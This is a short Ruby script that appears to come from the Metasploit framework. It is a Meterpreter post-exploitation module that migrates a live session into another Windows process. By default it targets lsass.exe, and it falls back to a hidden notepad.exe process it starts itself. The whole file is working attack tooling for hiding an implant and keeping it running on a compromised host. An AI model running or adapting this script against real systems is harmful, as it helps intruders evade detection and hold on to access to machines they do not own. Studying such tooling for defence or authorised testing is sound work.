# $Id$
#
# Simple example script that migrates to a specific process by name. 
# This is meant as an illustration.
#

spawn = false
target = nil

opts = Rex::Parser::Arguments.new(
	"-h" => [ false,"Help menu." ],
	"-f" => [ false, "Launch a process and migrate into the new process"]
)
opts.parse(args) { |opt, idx, val|
	case opt
	when "-f"
		spawn = true
	when "-h"
		print_line("")
		print_line("USAGE:   run migrate [process name]")
		print_line("EXAMPLE: run migrate explorer.exe")
		print_line(opts.usage)
		raise Rex::Script::Completed
	else
		target = val
	end
}




server = client.sys.process.open

print_status("Current server process: #{server.name} (#{server.pid})")

target_pid = nil

if ! spawn
	# Get the target process name
	target ||= "lsass.exe"
	print_status("Migrating to #{target}...")
	
	# Get the target process pid
	target_pid = client.sys.process[target]

	if not target_pid
		print_error("Could not access the target process")
		print_status("Spawning a notepad.exe host process...")
		note = client.sys.process.execute('notepad.exe', nil, {'Hidden' => true })
		target_pid = note.pid
	end
else
	target ||= "notepad.exe"
	print_status("Spawning a #{target} host process...")
	newproc = client.sys.process.execute(target, nil, {'Hidden' => true })
	target_pid = newproc.pid
	if not target_pid
		print_error("Could not create a process around #{target}")
		raise Rex::Script::Completed
	end
end

# Do the migration
print_status("Migrating into process ID #{target_pid}")
client.core.migrate(target_pid)
server = client.sys.process.open
print_status("New server process: #{server.name} (#{server.pid})")
